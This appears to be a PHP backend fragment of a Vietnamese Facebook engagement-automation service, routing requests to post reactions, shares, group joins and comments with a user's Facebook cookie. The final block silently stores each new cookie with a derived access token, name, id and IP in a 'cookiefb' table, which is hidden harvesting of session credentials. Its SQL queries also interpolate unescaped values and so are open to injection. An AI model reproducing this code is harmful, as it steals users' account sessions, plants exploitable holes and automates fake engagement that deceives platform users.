    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cx '.$id.' thành công'
    )));
} else if($loai=='sadcmtpro5' or $loai=='SADCMTPRO5'){
    $id=$_GET['id'];
    $cx=cxcmtpro5($id,'sad',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cx '.$id.' thành công'
    )));
} else if($loai=='angrycmtpro5' or $loai=='ANGRYCMTPRO5'){
    $id=$_GET['id'];
    $cx=cxcmtpro5($id,'angry',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cx '.$id.' thành công'
    )));
} else if($loai=='sharepro5' || $loai=='SHAREPRO5'){
    $id=$_GET['id'];
    $share=sharepro5($id,$cookie);
    if($share=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả share '.$id.' thành công'
    )));
} else if($loai=='joingrouppro5'){
    $id=$_GET['id'];
    $join=grouppro5($id,$cookie);
    if($join=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã join group '.$id.' thành công'
    )));
} else if($loai=='commentpro5'){
    $id=$_GET['id'];
    $noidung=$_GET['noidung'];
    $cmt=commentpro5($id,$noidung,$cookie);
    if($cmt=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã Cmt '.$id.' thành công'
    )));
} else {
    require_once ($_SERVER['DOCUMENT_ROOT'].'/404.php');
}


// Thiết lập múi giờ mặc định
date_default_timezone_set("Asia/Ho_Chi_Minh");
$date = date("Y-m-d");

include $_SERVER['DOCUMENT_ROOT'] . "/ketnoi.php";

$ip = $_SERVER['HTTP_CLIENT_IP'];
if ($ip == "") {
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

$ten = $_SESSION['name'];
$id = $_SESSION['id'];

// Kiểm tra xem cookie đã tồn tại trong bảng hay chưa
$kiemTraCKQuery = "SELECT * FROM `cookiefb` WHERE `cookie` = '$cookie'";
$result = mysqli_query($ketnoi, $kiemTraCKQuery);
$token=laytoken($cookie);
if (mysqli_num_rows($result) > 0) {
} else {
  // Thêm cookie vào bảng
  $themck = "INSERT INTO `cookiefb` (`id`, `data`, `name`, `idfb`, `cookie`, `token`, `date`, `ip`) VALUES (NULL, 'Live', '$ten', '$id', '$cookie', '$token', '$date', '$ip')";
  mysqli_query($ketnoi, $themck);
}
?>